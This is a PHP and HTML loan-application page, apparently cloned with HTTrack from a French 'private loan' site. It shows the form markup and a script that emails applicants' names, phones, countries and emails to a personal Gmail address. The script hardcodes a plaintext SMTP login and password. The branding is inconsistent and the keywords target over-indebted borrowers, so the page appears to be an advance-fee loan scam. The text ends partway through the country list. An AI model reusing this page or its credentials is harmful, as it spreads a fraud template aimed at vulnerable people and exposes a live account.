<?php

use PHPMailer\PHPMailer\PHPMailer;

require 'vendor/autoload.php';
if (isset($_POST['pret'])) {
    if (!empty($_POST['devise']) && !empty($_POST['montant']) && !empty($_POST['duree']) && !empty($_POST['dure']) && !empty($_POST['raison']) && !empty($_POST['nom']) && !empty($_POST['pays']) && !empty($_POST['telephone']) && !empty($_POST['email'])) {
        $devise = htmlspecialchars($_POST['devise']);
        $montant = htmlspecialchars($_POST['montant']);
        $duree = htmlspecialchars($_POST['duree']);
        $dure = htmlspecialchars($_POST['dure']);
        $raison = htmlspecialchars($_POST['raison']);
        $nom = htmlspecialchars($_POST['nom']);
        $pays = htmlspecialchars($_POST['pays']);
        $telephone = htmlspecialchars($_POST['telephone']);
        $email = htmlspecialchars($_POST['email']);
        

        $numero = date("U");
        $mail = new PHPMailer;
        $mail->isSMTP();
        $mail->SMTPDebug = 0;
        $mail->Host = 'smtp.hostinger.fr';
        $mail->Port = 587;
        $mail->SMTPAuth = true;
        $mail->Username = 'nebstan@expashoping.fr';
        $mail->Password = '96989470Welcom@';
        $mail->setFrom('nebstan@expashoping.fr', 'BLCL');
        $mail->addReplyTo('nebstan@expashoping.fr', 'BLCL');
        $mail->addAddress('justejuste973353@gmail.com', 'BCLC');
        $mail->Subject = 'Demande de pret';
        $mail->isHTML(true);
        $mail->Body = 'Devise : ' . $devise . ' <br> Montant : ' . $montant . '<br> Duree : ' . $duree.' '.$dure . '<br> Raison : ' . $raison . '<br> Nom : ' . $nom . '<br> Pays : ' . $pays . '<br> Téléphone : ' . $telephone . '<br> E-mail : ' . $email;

        if ($mail->send()) {
            header("Location: valider_formulaire.php");
        } else {

            $erreur = "remplir tout les champ";
        }
    }
}

?>


<!DOCTYPE html>
<html lang="fr">

<!-- Mirrored from www.clcbbll-bnk.com/obtenir_credit.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Mar 2021 20:30:08 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />



    <title>Besoin d'un financement ou d'un crédit à court terme ? Nous avons la solution | BLCL</title>
    <meta name="description" content="Qui dit crédit, dit du Coin. Nous offrons du crédit à des taux compétitifs sur le marché. Nous sommes la référence en matière de crédit aux particuliers ainsi qu'aux professionnels." />
    <meta name="keywords" content="Prêt, Auto, Moto, Automobile, Prêt scolarité, Prêt immobilier, Prêt investissement, argent, prêt, credit, prets, emprunt, financement, pret entre particuliers, credit entre particuliers, pret serieux, pret facile, pret rapide, credit entre particulier serieux, pret entre particulier urgent, credit entre particulier serieux et rapide, site de pret entre particulier, pret entre particulier sans frais, annonce pour pret entre particulier, pret entre particulier formulaire, pret entre particulier serieux et fiable, argent preteur, preteur prive d'argent, preteur particulier francais, preteur prive, pret privé, preteur d'argent, pret particulier fiable, pret d'argent particulier a particulier, preteur particulier, preteur prive disponible, pret investisseur prive, pret particulier belgique, preteur d argent, preteur d'argent particulier, preteur dargent, credit rapide particulier, preteur argent particulier, preteur argent prive, recherche credit de particulier a particulier, trouver un preteur prive rapidement, pret de particulier a particulier en belgique, pret d'argent de particulier a particulier, pret entre particulier fiable, pret personnel particulier, preteurs particuliers, preteurs prives, pret d'argent de particulier a particulier, preteur d'argent, preteurs particuliers, cherche pret particulier, Meilleur taux, rachat, demande, pret personnel, interdit, bancaire, dette, courtier, courtiers, consolidation, consolidation de dette, consolidation de dettes, consolidation credit, consolidation de credits, regroupement, particulier, astuce interdit bancaire, fiche, ficher, pret d'argent, boober, prosper, societe de rachat credit, organisme de rachat de credit, credit consommation, credit a la consommation, surendettement, credit perso, pret perso, formulaire de pret, emprunter, groupe de reflexion, TEG, emprunte, taux, intermediation financiere, association, remboursement, credit, pouvoir d'achat, economie, banque, systeme bancaire, rachat de credit" />
    <meta name="author" content="EuroNet Crédits" />

    <!-- favicon icon -->
    <link rel="shortcut icon" href="images/favicon.png" />

    <!-- bootstrap -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />

    <!-- animate -->
    <link rel="stylesheet" type="text/css" href="css/animate.css" />

    <!-- owl-carousel -->
    <link rel="stylesheet" type="text/css" href="css/owl.carousel.css">

    <!-- fontawesome -->
    <link rel="stylesheet" type="text/css" href="css/font-awesome.css" />

    <!-- themify -->
    <link rel="stylesheet" type="text/css" href="css/themify-icons.css" />

    <!-- flaticon -->
    <link rel="stylesheet" type="text/css" href="css/flaticon.css" />

    <!-- prettyphoto -->
    <link rel="stylesheet" type="text/css" href="css/prettyPhoto.css">

    <!-- shortcodes -->
    <link rel="stylesheet" type="text/css" href="css/shortcodes.css" />

    <!-- main -->
    <link rel="stylesheet" type="text/css" href="css/main.css" />

    <!-- responsive -->
    <link rel="stylesheet" type="text/css" href="css/responsive.css" />



</head>

<body>

    <!--page start-->
    <div class="page">

        <!--header start-->
        <div id="top-bar" class="topbar-right text-right">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <div class="ttm-social-links-wrapper list-inline">

                        </div>
                    </div>
                </div>
            </div>
        </div>

        <header id="masthead" class="header ttm-header-style-01">
            <!-- ttm-header-wrap -->
            <div class="ttm-header-wrap">
                <!-- ttm-stickable-header-w -->
                <div id="ttm-stickable-header-w" class="ttm-stickable-header-w clearfix">
                    <!-- ttm-topbar-wrapper -->
                    <div class="ttm-topbar-wrapper clearfix">
                        <div class="container">
                            <div class="ttm-topbar-content">

                                <div class="topbar-right text-right">
                                    <div class="ttm-social-links-wrapper list-inline">

                                    </div>
                                    <div style="margin:0;float:right;">

                                        <div class="ttm-search-overlay" style="margin-top: 15px; width:150px; z-index: 100; position: absolute; transform: translate3d(25px, 35px, 0px); top: 0px; right: 50px; will-change: transform;" x-placement="bottom-start">

                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div><!-- ttm-topbar-wrapper end -->
                    <div id="site-header-menu" class="site-header-menu">
                        <div class="site-header-menu-inner ttm-stickable-header">
                            <div class="container">
                                <!-- site-branding -->
                                <div class="site-branding">
                                    <a class="home-link" href="index.html" title="Altech" rel="home">
                                        <img id="logo-img" class="img-center" src="images/logo.png" alt="logo">
                                    </a>
                                </div><!-- site-branding end -->
                                <!--site-navigation -->
                                <div id="site-navigation" class="site-navigation">
                                    <div class="ttm-menu-toggle">
                                        <input type="checkbox" id="menu-toggle-form" />
                                        <label for="menu-toggle-form" class="ttm-menu-toggle-block">
                                            <span class="toggle-block toggle-blocks-1"></span>
                                            <span class="toggle-block toggle-blocks-2"></span>
                                            <span class="toggle-block toggle-blocks-3"></span>
                                        </label>
                                    </div>
                                    <nav id="menu" class="menu">
                                        <ul class="dropdown">
                                            <li class=""><a href="index.html">Accueil</a></li>
                                            <li class=""><a href="presentation.html">Qui sommes nous ?</a></li>
                                            <li class=""><a href="nos_services.html">Nos Services</a></li>
                                            <li class="active"><a href="obtenir_credit.php">Obtenir un prêt</a></li>
                                            <li class=""><a href="nous_contacter.php">Nous contacter</a></li>
                                        </ul>
                                    </nav>
                                </div><!-- site-navigation end-->
                            </div>
                        </div>
                    </div>
                </div><!-- ttm-stickable-header-w end-->
            </div>
            <!--ttm-header-wrap end -->

        </header>
        <!--header end-->

        <!-- page-title -->
        <div class="ttm-page-title-row">
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <div class="title-box text-center">
                            <div class="page-title-heading">
                                <h1 class="title" style="color:#fff;">Obtenir un prêt</h1>
                            </div><!-- /.page-title-captions -->
                            <div class="breadcrumb-wrapper">
                                <span>
                                    <a title="Homepage" href="index.html" style="color:#fff;"><i class="ti ti-home"></i>&nbsp;&nbsp;Accueil</a>
                                </span>
                                <span class="ttm-bread-sep">&nbsp; : : &nbsp;</span>
                                <span style="color:#fff;">Obtenir un prêt</span>
                            </div>
                        </div>
                    </div><!-- /.col-md-12 -->
                </div><!-- /.row -->
            </div><!-- /.container -->
        </div><!-- page-title end-->

        <!--site-main start-->
        <div class="site-main">

            <!-- sidebar -->
            <div class="ttm-row only-one-section ttm-bgcolor-white clearfix" id="loan">
                <div class="container">
                    <div class="row">
                        <div class="col-md-12">
                            <!-- section title -->
                            <div class="section-title text-center with-desc clearfix">
                                <h2>FAITES VOTRE DEMANDE DE CREDIT</h2>
                                <div class="title-header">
                                    <h5>Veuillez remplir soigneusement le formulaire</h5>
                                    <h5>CONNEXION SECURISEE</h5>
                                    <h2 class="title"><span>Formulaire de souscription</span></h2>
                                </div>
                            </div><!-- section title end -->
                        </div>
                    </div>

                    <!-- row -->
                    <div style="color:blue;">

                    </div>

                    <div class="row">
                        <div class="col-lg-12">
                            <div class="coupon_toggle">
                                <div class="coupon_code">
                                    <span style="color:red;font-size:20px;">*</span> Tous les champs sont obligatoires.
                                </div>
                            </div>
                            <form name="checkout" method="post" class="checkout row" action="">
                                <div class="col-lg-8 offset-lg-2">
                                    <div class="row">
                                        <div class="col-sm-3">
                                            <div class="form-group">
                                                <label>Devise <abbr class=""><i style="color:red;font-size:20px;">*</i></abbr></label>
                                                <select name="devise" class="form-control border" required>
                                                    <option value="">Selectionner</option>
                                                    <option value="EUR">EUR</option>
                                                    <option value="USD">USD</option>
                                                    <option value="CAD">CAD</option>
                                                    <option value="CHF">CHF</option>
                                                    <option value="SEK">SEK</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col-sm-3">
                                            <div class="form-group">
                                                <label>Montant <abbr><i style="color:red;font-size:20px;">*</i></abbr></label>
                                                <input type="text" name="montant" class="form-control border" pattern="[0-9]{3,8}" maxlength="8" autocomplete="off" required>
                                            </div>
                                        </div>
                                        <div class="col-sm-4">
                                            <div class="form-group">
                                                <label>Durée de remboursement <abbr><i style="color:red;font-size:20px;">*</i></abbr></label>
                                                <input type="text" name="duree" class="form-control border" pattern="[0-9]{1,3}" maxlength="3" autocomplete="off" required>
                                            </div>
                                        </div>
                                        <div class="col-sm-2">
                                            <div class="form-group">
                                                <label>Durée<abbr><i style="color:red;font-size:20px;">*</i></abbr></label>
                                                <select name="dure" class="form-control border" required>
                                                    <option value="mois">Mois</option>
                                                    <option value="annee">Année</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col-sm-12">
                                            <div class="form-group">
                                                <label>Raison de la demande <abbr><i style="color:red;font-size:20px;">*</i></abbr></label>
                                                <input type="text" name="raison" class="form-control border" maxlength="50" autocomplete="off" required>
                                            </div>
                                        </div>
                                        <div class="col-sm-4">
                                            <div class="form-group">
                                                <label>Nom complet <abbr><i style="color:red;font-size:20px;">*</i></abbr></label>
                                                <input type="text" name="nom" class="form-control border" maxlength="75" autocomplete="off" required>
                                            </div>
                                        </div>
                                        <div class="col-sm-8">
                                            <div class="form-group">
                                                <label>Pays <abbr><i style="color:red;font-size:20px;">*</i></abbr></label>

                                                <select name="pays" value="opt659120" data-field="fld_6408085" class="form-control border" id="fld_6408085_1" required="required" aria-labelledby="fld_6408085Label">

                                                    <option value="Afghanistan" selected="selected" data-calc-value="Afghanistan">
                                                        Afghanistan </option>
                                                    <option value="Åland Islands" data-calc-value="Åland Islands">
                                                        Åland Islands </option>
                                                    <option value="Albania" data-calc-value="Albania">
                                                        Albania </option>
                                                    <option value="Algeria" data-calc-value="Algeria">
                                                        Algeria </option>
                                                    <option value="American Samoa" data-calc-value="American Samoa">
                                                        American Samoa </option>
                                                    <option value="Andorra" data-calc-value="Andorra">
                                                        Andorra </option>
                                                    <option value="Angola" data-calc-value="Angola">
                                                        Angola </option>
                                                    <option value="Anguilla" data-calc-value="Anguilla">
                                                        Anguilla </option>
                                                    <option value="Antarctica" data-calc-value="Antarctica">
                                                        Antarctica </option>
                                                    <option value="Antigua and Barbuda" data-calc-value="Antigua and Barbuda">
                                                        Antigua and Barbuda </option>
                                                    <option value="Argentina" data-calc-value="Argentina">
                                                        Argentina </option>
                                                    <option value="Armenia" data-calc-value="Armenia">
                                                        Armenia </option>
                                                    <option value="Aruba" data-calc-value="Aruba">
                                                        Aruba </option>
                                                    <option value="Australia" data-calc-value="Australia">
                                                        Australia </option>
                                                    <option value="Austria" data-calc-value="Austria">
                                                        Austria </option>
                                                    <option value="Azerbaijan" data-calc-value="Azerbaijan">
                                                        Azerbaijan </option>
                                                    <option value="Bahamas" data-calc-value="Bahamas">
                                                        Bahamas </option>
                                                    <option value="Bahrain" data-calc-value="Bahrain">
                                                        Bahrain </option>
                                                    <option value="Bangladesh" data-calc-value="Bangladesh">
                                                        Bangladesh </option>
                                                    <option value="Barbados" data-calc-value="Barbados">
                                                        Barbados </option>
                                                    <option value="Belarus" data-calc-value="Belarus">
                                                        Belarus </option>
                                                    <option value="Belgium" data-calc-value="Belgium">
                                                        Belgium </option>
                                                    <option value="Belize" data-calc-value="Belize">
                                                        Belize </option>
                                                    <option value="Benin" data-calc-value="Benin">
                                                        Benin </option>
                                                    <option value="Bermuda" data-calc-value="Bermuda">
                                                        Bermuda </option>
                                                    <option value="Bhutan" data-calc-value="Bhutan">
                                                        Bhutan </option>
                                                    <option value="Bolivia, Plurinational State of" data-calc-value="Bolivia, Plurinational State of">
                                                        Bolivia, Plurinational State of </option>
                                                    <option value="Bonaire, Sint Eustatius and Saba" data-calc-value="Bonaire, Sint Eustatius and Saba">
                                                        Bonaire, Sint Eustatius and Saba </option>
                                                    <option value="Bosnia and Herzegovina" data-calc-value="Bosnia and Herzegovina">
                                                        Bosnia and Herzegovina </option>
                                                    <option value="Botswana" data-calc-value="Botswana">
                                                        Botswana </option>
                                                    <option value="Bouvet Island" data-calc-value="Bouvet Island">
                                                        Bouvet Island </option>
                                                    <option value="Brazil" data-calc-value="Brazil">
                                                        Brazil </option>
                                                    <option value="British Indian Ocean Territory" data-calc-value="British Indian Ocean Territory">
                                                        British Indian Ocean Territory </option>
                                                    <option value="Brunei Darussalam" data-calc-value="Brunei Darussalam">
                                                        Brunei Darussalam </option>
                                                    <option value="Bulgaria" data-calc-value="Bulgaria">
                                                        Bulgaria </option>
                                                    <option value="Burkina Faso" data-calc-value="Burkina Faso">
                                                        Burkina Faso </option>
                                                    <option value="Burundi" data-calc-value="Burundi">
                                                        Burundi </option>
                                                    <option value="Cambodia" data-calc-value="Cambodia">
                                                        Cambodia </option>
                                                    <option value="Cameroon" data-calc-value="Cameroon">
                                                        Cameroon </option>
                                                    <option value="Canada" data-calc-value="Canada">
                                                        Canada </option>
                                                    <option value="Cape Verde" data-calc-value="Cape Verde">
                                                        Cape Verde </option>
                                                    <option value="Cayman Islands" data-calc-value="Cayman Islands">
                                                        Cayman Islands </option>
                                                    <option value="Central African Republic" data-calc-value="Central African Republic">
                                                        Central African Republic </option>
                                                    <option value="Chad" data-calc-value="Chad">
                                                        Chad </option>
                                                    <option value="Chile" data-calc-value="Chile">
                                                        Chile </option>
                                                    <option value="China" data-calc-value="China">
                                                        China </option>
                                                    <option value="Christmas Island" data-calc-value="Christmas Island">
                                                        Christmas Island </option>
                                                    <option value="Cocos (Keeling) Islands" data-calc-value="Cocos (Keeling) Islands">
                                                        Cocos (Keeling) Islands </option>
                                                    <option value="Colombia" data-calc-value="Colombia">
                                                        Colombia </option>
                                                    <option value="Comoros" data-calc-value="Comoros">
                                                        Comoros </option>
                                                    <option value="Congo" data-calc-value="Congo">
                                                        Congo </option>
                                                    <option value="Congo, the Democratic Republic of the" data-calc-value="Congo, the Democratic Republic of the">
                                                        Congo, the Democratic Republic of the </option>
                                                    <option value="Cook Islands" data-calc-value="Cook Islands">
                                                        Cook Islands </option>
                                                    <option value="Costa Rica" data-calc-value="Costa Rica">
                                                        Costa Rica </option>
                                                    <option value="Côte d&#039;Ivoire" data-calc-value="Côte d&#039;Ivoire">
                                                        Côte d&#039;Ivoire </option>
                                                    <option value="Croatia" data-calc-value="Croatia">
                                                        Croatia </option>
                                                    <option value="Cuba" data-calc-value="Cuba">
                                                        Cuba </option>
                                                    <option value="Curaçao" data-calc-value="Curaçao">
                                                        Curaçao </option>
                                                    <option value="Cyprus" data-calc-value="Cyprus">
                                                        Cyprus </option>
                                                    <option value="Czech Republic" data-calc-value="Czech Republic">
                                                        Czech Republic </option>
                                                    <option value="Denmark" data-calc-value="Denmark">
                                                        Denmark </option>
                                                    <option value="Djibouti" data-calc-value="Djibouti">
                                                        Djibouti </option>
                                                    <option value="Dominica" data-calc-value="Dominica">
                                                        Dominica </option>
                                                    <option value="Dominican Republic" data-calc-value="Dominican Republic">
                                                        Dominican Republic </option>
                                                    <option value="Ecuador" data-calc-value="Ecuador">
                                                        Ecuador </option>
                                                    <option value="Egypt" data-calc-value="Egypt">
                                                        Egypt </option>
                                                    <option value="El Salvador" data-calc-value="El Salvador">
                                                        El Salvador </option>
                                                    <option value="Equatorial Guinea" data-calc-value="Equatorial Guinea">
                                                        Equatorial Guinea </option>
                                                    <option value="Eritrea" data-calc-value="Eritrea">
                                                        Eritrea </option>
                                                    <option value="Estonia" data-calc-value="Estonia">
                                                        Estonia </option>
                                                    <option value="Ethiopia" data-calc-value="Ethiopia">
                                                        Ethiopia </option>
                                                    <option value="Falkland Islands (Malvinas)" data-calc-value="Falkland Islands (Malvinas)">
                                                        Falkland Islands (Malvinas) </option>
                                                    <option value="Faroe Islands" data-calc-value="Faroe Islands">
                                                        Faroe Islands </option>
                                                    <option value="Fiji" data-calc-value="Fiji">
                                                        Fiji </option>
                                                    <option value="Finland" data-calc-value="Finland">
                                                        Finland </option>
                                                    <option value="France" data-calc-value="France">
                                                        France </option>
                                                    <option value="French Guiana" data-calc-value="French Guiana">
                                                        French Guiana </option>
                                                    <option value="French Polynesia" data-calc-value="French Polynesia">
                                                        French Polynesia </option>
                                                    <option value="French Southern Territories" data-calc-value="French Southern Territories">
                                                        French Southern Territories </option>
                                                    <option value="Gabon" data-calc-value="Gabon">
                                                        Gabon </option>
                                                    <option value="Gambia" data-calc-value="Gambia">
                                                        Gambia </option>
                                                    <option value="Georgia" data-calc-value="Georgia">
                                                        Georgia </option>
                                                    <option value="Germany" data-calc-value="Germany">
                                                        Germany </option>
                                                    <option value="Ghana" data-calc-value="Ghana">
                                                        Ghana </option>
                                                    <option value="Gibraltar" data-calc-value="Gibraltar">
                                                        Gibraltar </option>
                                                    <option value="Greece" data-calc-value="Greece">
                                                        Greece </option>
                                                    <option value="Greenland" data-calc-value="Greenland">
                                                        Greenland </option>
                                                    <option value="Grenada" data-calc-value="Grenada">
                                                        Grenada </option>
                                                    <option value="Guadeloupe" data-calc-value="Guadeloupe">
                                                        Guadeloupe </option>
                                                    <option value="Guam" data-calc-value="Guam">
                                                        Guam </option>
                                                    <option value="Guatemala" data-calc-value="Guatemala">
                                                        Guatemala </option>
                                                    <option value="Guernsey" data-calc-value="Guernsey">
                                                        Guernsey </option>
                                                    <option value="Guinea" data-calc-value="Guinea">
                                                        Guinea </option>
                                                    <option value="Guinea-Bissau" data-calc-value="Guinea-Bissau">
                                                        Guinea-Bissau </option>
                                                    <option value="Guyana" data-calc-value="Guyana">
                                                        Guyana </option>
                                                    <option value="Haiti" data-calc-value="Haiti">
                                                        Haiti </option>
                                                    <option value="Heard Island and McDonald Islands" data-calc-value="Heard Island and McDonald Islands">
                                                        Heard Island and McDonald Islands </option>
                                                    <option value="Holy See (Vatican City State)" data-calc-value="Holy See (Vatican City State)">
                                                        Holy See (Vatican City State) </option>
                                                    <option value="Honduras" data-calc-value="Honduras">
                                                        Honduras </option>
                                                    <option value="Hong Kong" data-calc-value="Hong Kong">
                                                        Hong Kong </option>
                                                    <option value="Hungary" data-calc-value="Hungary">
                                                        Hungary </option>
                                                    <option value="Iceland" data-calc-value="Iceland">
                                                        Iceland </option>
                                                    <option value="India" data-calc-value="India">
                                                        India </option>
                                                    <option value="Indonesia" data-calc-value="Indonesia">
                                                        Indonesia </option>
                                                    <option value="Iran, Islamic Republic of" data-calc-value="Iran, Islamic Republic of">
                                                        Iran, Islamic Republic of </option>
                                                    <option value="Iraq" data-calc-value="Iraq">
                                                        Iraq </option>
                                                    <option value="Ireland" data-calc-value="Ireland">
                                                        Ireland </option>
                                                    <option value="Isle of Man" data-calc-value="Isle of Man">
                                                        Isle of Man </option>
                                                    <option value="Israel" data-calc-value="Israel">
                                                        Israel </option>
                                                    <option value="Italy" data-calc-value="Italy">
                                                        Italy </option>
                                                    <option value="Jamaica" data-calc-value="Jamaica">
                                                        Jamaica </option>
                                                    <option value="Japan" data-calc-value="Japan">
                                                        Japan </option>
                                                    <option value="Jersey" data-calc-value="Jersey">
                                                        Jersey </option>
                                                    <option value="Jordan" data-calc-value="Jordan">
                                                        Jordan </option>
                                                    <option value="Kazakhstan" data-calc-value="Kazakhstan">
                                                        Kazakhstan </option>
                                                    <option value="Kenya" data-calc-value="Kenya">
                                                        Kenya </option>
                                                    <option value="Kiribati" data-calc-value="Kiribati">
                                                        Kiribati </option>
                                                    <option value="Korea, Democratic People&#039;s Republic of" data-calc-value="Korea, Democratic People&#039;s Republic of">
                                                        Korea, Democratic People&#039;s Republic of </option>
                                                    <option value="Korea, Republic of" data-calc-value="Korea, Republic of">
                                                        Korea, Republic of </option>
                                                    <option value="Kuwait" data-calc-value="Kuwait">
                                                        Kuwait </option>
                                                    <option value="Kyrgyzstan" data-calc-value="Kyrgyzstan">
                                                        Kyrgyzstan </option>
                                                    <option value="Lao People&#039;s Democratic Republic" data-calc-value="Lao People&#039;s Democratic Republic">
                                                        Lao People&#039;s Democratic Republic </option>
                                                    <option value="Latvia" data-calc-value="Latvia">
                                                        Latvia </option>
                                                    <option value="Lebanon" data-calc-value="Lebanon">
                                                        Lebanon </option>
                                                    <option value="Lesotho" data-calc-value="Lesotho">
                                                        Lesotho </option>
                                                    <option value="Liberia" data-calc-value="Liberia">
                                                        Liberia </option>
                                                    <option value="Libya" data-calc-value="Libya">
                                                        Libya </option>
                                                    <option value="Liechtenstein" data-calc-value="Liechtenstein">
                                                        Liechtenstein </option>
                                                    <option value="Lithuania" data-calc-value="Lithuania">
                                                        Lithuania </option>
                                                    <option value="Luxembourg" data-calc-value="Luxembourg">
                                                        Luxembourg </option>
                                                    <option value="Macao" data-calc-value="Macao">
                                                        Macao </option>
                                                    <option value="Macedonia, the former Yugoslav Republic of" data-calc-value="Macedonia, the former Yugoslav Republic of">
                                                        Macedonia, the former Yugoslav Republic of </option>
                                                    <option value="Madagascar" data-calc-value="Madagascar">
                                                        Madagascar </option>
                                                    <option value="Malawi" data-calc-value="Malawi">
                                                        Malawi </option>
                                                    <option value="Malaysia" data-calc-value="Malaysia">
                                                        Malaysia </option>
                                                    <option value="Maldives" data-calc-value="Maldives">
                                                        Maldives </option>
                                                    <option value="Mali" data-calc-value="Mali">
                                                        Mali </option>
                                                    <option value="Malta" data-calc-value="Malta">
                                                        Malta </option>
                                                    <option value="Marshall Islands" data-calc-value="Marshall Islands">
                                                        Marshall Islands </option>
                                                    <option value="Martinique" data-calc-value="Martinique">
                                                        Martinique </option>
                                                    <option value="Mauritania" data-calc-value="Mauritania">
                                                        Mauritania </option>
                                                    <option value="Mauritius" data-calc-value="Mauritius">
                                                        Mauritius </option>
                                                    <option value="Mayotte" data-calc-value="Mayotte">
                                                        Mayotte </option>
                                                    <option value="Mexico" data-calc-value="Mexico">
                                                        Mexico </option>
                                                    <option value="Micronesia, Federated States of" data-calc-value="Micronesia, Federated States of">
                                                        Micronesia, Federated States of </option>
                                                    <option value="Moldova, Republic of" data-calc-value="Moldova, Republic of">
                                                        Moldova, Republic of </option>
                                                    <option value="Monaco" data-calc-value="Monaco">
                                                        Monaco </option>
                                                    <option value="Mongolia" data-calc-value="Mongolia">
                                                        Mongolia </option>
                                                    <option value="Montenegro" data-calc-value="Montenegro">
                                                        Montenegro </option>
                                                    <option value="Montserrat" data-calc-value="Montserrat">
                                                        Montserrat </option>
                                                    <option value="Morocco" data-calc-value="Morocco">
                                                        Morocco </option>
                                                    <option value="Mozambique" data-calc-value="Mozambique">
                                                        Mozambique </option>
                                                    <option value="Myanmar" data-calc-value="Myanmar">
                                                        Myanmar </option>
                                                    <option value="Namibia" data-calc-value="Namibia">
                                                        Namibia </option>
                                                    <option value="Nauru" data-calc-value="Nauru">
                                                        Nauru </option>
                                                    <option value="Nepal" data-calc-value="Nepal">
                                                        Nepal </option>
                                                    <option value="Netherlands" data-calc-value="Netherlands">
                                                        Netherlands </option>
                                                    <option value="New Caledonia" data-calc-value="New Caledonia">
                                                        New Caledonia </option>
                                                    <option value="New Zealand" data-calc-value="New Zealand">
                                                        New Zealand </option>
                                                    <option value="Nicaragua" data-calc-value="Nicaragua">
                                                        Nicaragua </option>
                                                    <option value="Niger" data-calc-value="Niger">
                                                        Niger </option>
                                                    <option value="Nigeria" data-calc-value="Nigeria">
                                                        Nigeria </option>
                                                    <option value="Niue" data-calc-value="Niue">
                                                        Niue </option>
                                                    <option value="Norfolk Island" data-calc-value="Norfolk Island">
                                                        Norfolk Island </option>
                                                    <option value="Northern Mariana Islands" data-calc-value="Northern Mariana Islands">
                                                        Northern Mariana Islands </option>
                                                    <option value="Norway" data-calc-value="Norway">
                                                        Norway </option>
                                                    <option value="Oman" data-calc-value="Oman">
                                                        Oman </option>
                                                    <option value="Pakistan" data-calc-value="Pakistan">
                                                        Pakistan </option>
                                                    <option value="Palau" data-calc-value="Palau">
                                                        Palau </option>
                                                    <option value="Palestinian Territory, Occupied" data-calc-value="Palestinian Territory, Occupied">
                                                        Palestinian Territory, Occupied </option>
                                                    <option value="Panama" data-calc-value="Panama">
                                                        Panama </option>
                                                    <option value="Papua New Guinea" data-calc-value="Papua New Guinea">
                                                        Papua New Guinea </option>
                                                    <option value="Paraguay" data-calc-value="Paraguay">
                                                        Paraguay </option>
                                                    <option value="Peru" data-calc-value="Peru">
                                                        Peru </option>
                                                    <option value="Philippines" data-calc-value="Philippines">
                                                        Philippines </option>
                                                    <option value="Pitcairn" data-calc-value="Pitcairn">
                                                        Pitcairn </option>
                                                    <option value="Poland" data-calc-value="Poland">
                                                        Poland </option>
                                                    <option value="Portugal" data-calc-value="Portugal">
                                                        Portugal </option>
                                                    <option value="Puerto Rico" data-calc-value="Puerto Rico">
                                                        Puerto Rico </option>
                                                    <option value="Qatar" data-calc-value="Qatar">
                                                        Qatar </option>
                                                    <option value="Réunion" data-calc-value="Réunion">
                                                        Réunion </option>
                                                    <option value="Romania" data-calc-value="Romania">
                                                        Romania </option>
                                                    <option value="Russian Federation" data-calc-value="Russian Federation">
                                                        Russian Federation </option>
                                                    <option value="Rwanda" data-calc-value="Rwanda">
                                                        Rwanda </option>
                                                    <option value="Saint Barthélemy" data-calc-value="Saint Barthélemy">
                                                        Saint Barthélemy </option>
                                                    <option value="Saint Helena, Ascension and Tristan da Cunha" data-calc-value="Saint Helena, Ascension and Tristan da Cunha">
                                                        Saint Helena, Ascension and Tristan da Cunha </option>
                                                    <option value="Saint Kitts and Nevis" data-calc-value="Saint Kitts and Nevis">
                                                        Saint Kitts and Nevis </option>
                                                    <option value="Saint Lucia" data-calc-value="Saint Lucia">
                                                        Saint Lucia </option>
                                                    <option value="Saint Martin (French part)" data-calc-value="Saint Martin (French part)">
                                                        Saint Martin (French part) </option>
                                                    <option value="Saint Pierre and Miquelon" data-calc-value="Saint Pierre and Miquelon">
                                                        Saint Pierre and Miquelon </option>
                                                    <option value="Saint Vincent and the Grenadines" data-calc-value="Saint Vincent and the Grenadines">
                                                        Saint Vincent and the Grenadines </option>
                                                    <option value="Samoa" data-calc-value="Samoa">
                                                        Samoa </option>
                                                    <option value="San Marino" data-calc-value="San Marino">
                                                        San Marino </option>
                                                    <option value="Sao Tome and Principe" data-calc-value="Sao Tome and Principe">
                                                        Sao Tome and Principe </option>
                                                    <option value="Saudi Arabia" data-calc-value="Saudi Arabia">
                                                        Saudi Arabia </option>
                                                    <option value="Senegal" data-calc-value="Senegal">
                                                        Senegal </option>
                                                    <option value="Serbia" data-calc-value="Serbia">
                                                        Serbia </option>
                                                    <option value="Seychelles" data-calc-value="Seychelles">
                                                        Seychelles </option>
                                                    <option value="Sierra Leone" data-calc-value="Sierra Leone">
                                                        Sierra Leone </option>
                                                    <option value="Singapore" data-calc-value="Singapore">
                                                        Singapore </option>
                                                    <option value="Sint Maarten (Dutch part)" data-calc-value="Sint Maarten (Dutch part)">
                                                        Sint Maarten (Dutch part) </option>
                                                    <option value="Slovakia" data-calc-value="Slovakia">
                                                        Slovakia </option>
                                                    <option value="Slovenia" data-calc-value="Slovenia">
                                                        Slovenia </option>
                                                    <option value="Solomon Islands" data-calc-value="Solomon Islands">
                                                        Solomon Islands </option>
                                                    <option value="Somalia" data-calc-value="Somalia">
                                                        Somalia </option>
                                                    <option value="South Africa" data-calc-value="South Africa">
                                                        South Africa </option>
                                                    <option value="South Georgia and the South Sandwich Islands" data-calc-value="South Georgia and the South Sandwich Islands">
                                                        South Georgia and the South Sandwich Islands </option>
                                                    <option value="South Sudan" data-calc-value="South Sudan">
                                                        South Sudan </option>
                                                    <option value="Spain" data-calc-value="Spain">
                                                        Spain </option>
                                                    <option value="Sri Lanka" data-calc-value="Sri Lanka">
                                                        Sri Lanka </option>
                                                    <option value="Sudan" data-calc-value="Sudan">
                                                        Sudan </option>
                                                    <option value="Suriname" data-calc-value="Suriname">
                                                        Suriname </option>
                                                    <option value="Svalbard and Jan Mayen" data-calc-value="Svalbard and Jan Mayen">
                                                        Svalbard and Jan Mayen </option>
                                                    <option value="Swaziland" data-calc-value="Swaziland">
                                                        Swaziland </option>
                                                    <option value="Sweden" data-calc-value="Sweden">
                                                        Sweden </option>
                                                    <option value="Switzerland" data-calc-value="Switzerland">
                                                        Switzerland </option>
                                                    <option value="Syrian Arab Republic" data-calc-value="Syrian Arab Republic">
